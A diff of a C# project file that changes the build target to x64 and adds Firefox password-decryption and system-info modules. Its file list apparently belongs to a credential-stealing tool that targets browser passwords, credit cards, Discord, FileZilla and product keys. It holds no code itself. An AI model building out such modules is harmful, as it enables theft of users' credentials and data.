@@ -40,7 +40,7 @@
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
-    <PlatformTarget>x86</PlatformTarget>
+    <PlatformTarget>x64</PlatformTarget>
     <DebugType>pdbonly</DebugType>
     <Optimize>true</Optimize>
     <OutputPath>bin\Release\</OutputPath>
@@ -122,6 +122,8 @@
     <Compile Include="Modules\Passwords\Targets\Browsers\Edge\Bookmarks.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Edge\CreditCards.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Edge\Edge.cs" />
+    <Compile Include="Modules\Passwords\Targets\Browsers\Firefox\Decryptor.cs" />
+    <Compile Include="Modules\Passwords\Targets\Browsers\Firefox\Passwords.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Internet Explorer\InternetExplorer.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Internet Explorer\Passwords.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Internet Explorer\VaultCli.cs" />
@@ -141,6 +143,7 @@
     <Compile Include="Modules\Passwords\Targets\Messengers\Discord.cs" />
     <Compile Include="Modules\Passwords\Targets\FileZilla.cs" />
     <Compile Include="Modules\Passwords\Targets\System\FileGrabber.cs" />
+    <Compile Include="Modules\Passwords\Targets\System\Info.cs" />
     <Compile Include="Modules\Passwords\Targets\System\InstalledApps.cs" />
     <Compile Include="Modules\Passwords\Targets\System\ProcessList.cs" />
     <Compile Include="Modules\Passwords\Targets\System\ProductKey.cs" />
